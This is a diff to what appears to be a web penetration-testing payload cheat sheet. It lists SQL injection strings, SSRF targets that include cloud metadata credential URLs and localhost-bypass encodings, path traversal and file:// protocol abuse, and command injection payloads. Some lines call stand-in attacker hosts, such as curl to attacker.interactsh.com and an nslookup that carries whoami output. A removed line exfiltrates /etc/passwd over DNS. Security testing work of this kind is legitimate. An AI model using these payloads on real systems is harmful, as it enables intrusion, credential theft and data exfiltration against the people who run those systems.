@@ -53,7 +53,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 ' OR 1=1--
 ' OR 1=1#
 admin'--
-admin' #
 
 -- Boolean-based
 1 AND 1=1
@@ -61,18 +60,15 @@ admin' #
 ' AND 1=1--
 ' AND 1=2--
 
--- Time-based (MySQL)
+-- Time-based MySQL
 ' AND SLEEP(5)--
 1; SELECT SLEEP(5)--
-' OR SLEEP(5)--
 
--- Time-based (MSSQL)
+-- Time-based MSSQL
 '; WAITFOR DELAY '0:0:5'--
-' AND 1=1; WAITFOR DELAY '0:0:5'--
 
--- Time-based (PostgreSQL)
+-- Time-based PostgreSQL
 '; SELECT pg_sleep(5)--
-' AND 1=1; SELECT pg_sleep(5)--
 
 -- Union-based
 ' UNION SELECT NULL--
@@ -81,7 +77,7 @@ admin' #
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT username,password FROM users--
 
--- Out-of-band (MySQL)
+-- Out-of-band MySQL
 ' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
 ```
 
@@ -95,7 +91,7 @@ http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/user-data/
 
-# GCP Metadata (needs header: Metadata-Flavor: Google)
+# GCP Metadata (requires header: Metadata-Flavor: Google)
 http://metadata.google.internal/computeMetadata/v1/
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 
@@ -111,6 +107,7 @@ http://0/
 http://127.1
 http://2130706433    # decimal 127.0.0.1
 http://0177.0.0.1    # octal
+http://0x7f000001    # hex
 
 # Protocol abuse
 file:///etc/passwd
@@ -138,7 +135,6 @@ expect://id
 # Windows
 ..\..\..\windows\win.ini
 ..%5c..%5c..%5cwindows%5cwin.ini
-C:\Windows\System32\drivers\etc\hosts
 ```
 
 ---
@@ -146,7 +142,6 @@ C:\Windows\System32\drivers\etc\hosts
 ## Command Injection Payloads
 
 ```bash
-# Chained commands
 ; id
 | id
 || id
@@ -154,23 +149,18 @@ C:\Windows\System32\drivers\etc\hosts
 && id
 `id`
 $(id)
-%0aid      # URL-encoded newline
-%0d%0aid   # URL-encoded CRLF
+%0aid
+%0d%0aid
 
-# Blind time-based
+# Time-based blind
 ; sleep 5
 | sleep 5
 $(sleep 5)
-& ping -c 5 127.0.0.1
-; timeout 5
 
 # OOB detection
 ; curl http://attacker.interactsh.com
 ; nslookup $(whoami).attacker.com
 $(curl http://attacker.interactsh.com)
-
-# Data exfiltration via DNS
-; nslookup $(cat /etc/passwd|head -1|base64).attacker.com
 ```
 
 ---
